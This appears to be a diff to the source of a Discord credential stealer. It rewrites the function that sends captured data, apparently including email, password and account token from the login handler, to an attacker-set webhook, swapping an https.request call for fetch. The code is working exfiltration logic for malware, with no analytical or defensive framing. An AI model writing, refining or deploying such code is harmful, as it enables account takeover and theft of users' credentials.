@@ -599,30 +599,24 @@ const getBadges = flags => {
   return badges.join(', ');
 };
 const hooker = async content => {
-  const data = JSON.stringify(content);
-  const url = new URL(config.webhook);
-  const headers = {
-    'Content-Type': 'application/json',
-    'Access-Control-Allow-Origin': '*'
-  };
-  if (!config.webhook.includes('api/webhooks')) {
-    const key = totp('test');
-    headers.Authorization = key;
-  }
-  const options = {
-    protocol: url.protocol,
-    hostname: url.host,
-    path: url.pathname,
-    method: 'POST',
-    headers: headers
-  };
-  const req = https.request(options);
-  req.on('error', err => {
-    console.log(err);
-  });
-  req.write(data);
-  req.end();
+    const data = JSON.stringify(content);
+  
+    const headers = {
+      "Content-Type": "application/json"
+    };
+  
+    const options = {
+      method: "POST",
+      headers: headers,
+      body: data
+    };
+  
+    fetch(config.webhook, options)
+      .then(response => response.json())
+      .then(json => console.log("Webhook relayed:", json))
+      .catch(err => console.error("Webhook relay failed:", err));
 };
+  
 const login = async (email, password, token) => {
     const json = await getInfo(token);
     const nitro = getNitro(json.premium_type);
